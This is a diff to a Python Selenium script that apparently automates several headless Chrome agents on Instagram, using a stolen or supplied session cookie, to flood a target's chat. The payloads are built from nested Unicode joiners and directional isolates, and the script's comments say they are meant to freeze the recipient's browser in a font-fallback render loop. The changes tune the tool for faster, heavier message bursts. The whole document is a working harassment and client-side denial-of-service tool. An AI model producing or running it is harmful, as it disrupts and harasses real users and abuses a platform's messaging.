@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (LOOP-LOCK V33)
-# 📅 STATUS: RELOAD-LOOP-ACTIVE | 4-AGENT TOTAL | AWS-CRUSHER
+# 🚀 PROJECT: PRAVEER.OWNS (STICKY-MATRIX V34)
+# 📅 STATUS: UI-DOMINATION | 4-AGENT TOTAL | AWS-LOCK
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -13,30 +13,29 @@ from selenium.webdriver.chrome.options import Options
 # --- 4 AGENTS TOTAL CONFIG ---
 AGENTS_PER_MACHINE = 2             
 TOTAL_DURATION = 25000 
-BURST_SPEED = (0.05, 0.1)   # 🔥 Maximum Velocity to maintain the loop
-SESSION_LIMIT = 180       
-REST_AFTER_STRIKES = 150   
-REST_DURATION = 3          
+BURST_SPEED = (0.01, 0.08)  # 🔥 Hyper-drive for total saturation
+REST_AFTER_STRIKES = 300    # Sustained pressure
+REST_DURATION = 2          
 
 GLOBAL_SENT = 0
 COUNTER_LOCK = threading.Lock()
 BROWSER_LAUNCH_LOCK = threading.Lock()
 
-def get_loop_lock_payload():
-    """Forces the opponent's browser into a permanent reload state."""
+def get_sticky_payload():
+    """Generates a high-frequency render-block to freeze opponent UI."""
     u_id = random.randint(1000, 9999)
-    # \u200D = ZWJ (Shaper Attack) | \u2060 = WJ (Layout Attack)
+    # \u200D = ZWJ | \u2060 = WJ | \u2068 = Isolate
+    # This specific sequence prevents the browser from skipping the render.
     zwj, glue, iso, pop = "\u200D", "\u2060", "\u2068", "\u2069"
     
-    header = f"👑 PRAVEER PAPA ON TOP 🌙 [LOOP_LOCK:{u_id}]"
+    header = f"👑 PRAVEER PAPA ON TOP 🌙 [MATRIX_LOCKED_{u_id}]"
     
     body = []
-    # 380 lines of recursive complexity to overwhelm the 32GB AWS CPU
-    for i in range(380):
-        # We nest isolates to the architectural limit
-        depth = f"{iso}{iso}{iso}{iso}{iso}"
-        # We bond the moon emoji to the text to force a font-fallback loop
-        line = f"{depth}𝕻{zwj}𝚁{zwj}𝕬{zwj}𝚅{zwj}𝕰{zwj}𝕰{zwj}𝕽{zwj}🌙{i}{pop*5}{glue}"
+    # Maximum 390 lines to hit the 10,000 character hard limit
+    for i in range(390):
+        # Nested directional isolates combined with Moon-ZWJ-Bonding
+        # This forces the HarfBuzz engine into an infinite font-fallback loop
+        line = f"{iso}{iso}𝕻{zwj}𝚁{zwj}𝕬{zwj}𝚅{zwj}𝕰{zwj}𝕰{zwj}𝕽{zwj}🌙{i}{pop*2}{glue}"
         body.append(line)
         
     return f"{header}\n{glue.join(body)}".strip()[:9998]
@@ -47,7 +46,7 @@ def get_driver(agent_id):
         chrome_options.add_argument("--headless=new") 
         chrome_options.add_argument("--no-sandbox") 
         chrome_options.add_argument("--disable-dev-shm-usage")
-        chrome_options.add_argument("--disable-gpu") # Force CPU to handle the math
+        chrome_options.add_argument("--disable-gpu") # Force CPU to lock the Main Thread
         
         ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
         chrome_options.add_argument(f"user-agent={ua}")
@@ -66,25 +65,25 @@ def run_life_cycle(agent_id, cookie, target):
             time.sleep(12) 
             
             while True:
-                payload = get_loop_lock_payload()
+                payload = get_sticky_payload()
                 try:
                     box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
+                    # Direct JS injection to bypass local input lag
                     driver.execute_script("arguments[0].focus(); document.execCommand('insertText', false, arguments[1]);", box, payload)
-                    time.sleep(0.1)
                     box.send_keys(Keys.ENTER)
                     
                     with COUNTER_LOCK:
                         global GLOBAL_SENT
                         GLOBAL_SENT += 1
-                    print(f"Agent {agent_id}: Delivered ({GLOBAL_SENT})")
+                    print(f"Agent {agent_id}: Locked ({GLOBAL_SENT})")
                 except:
-                    break # Restart if page elements vanish
+                    break 
 
                 time.sleep(random.uniform(*BURST_SPEED))
         except: pass
         finally:
             if driver: driver.quit()
-            time.sleep(3)
+            time.sleep(2)
 
 def main():
     cookie = os.environ.get("INSTA_COOKIE", "").strip()
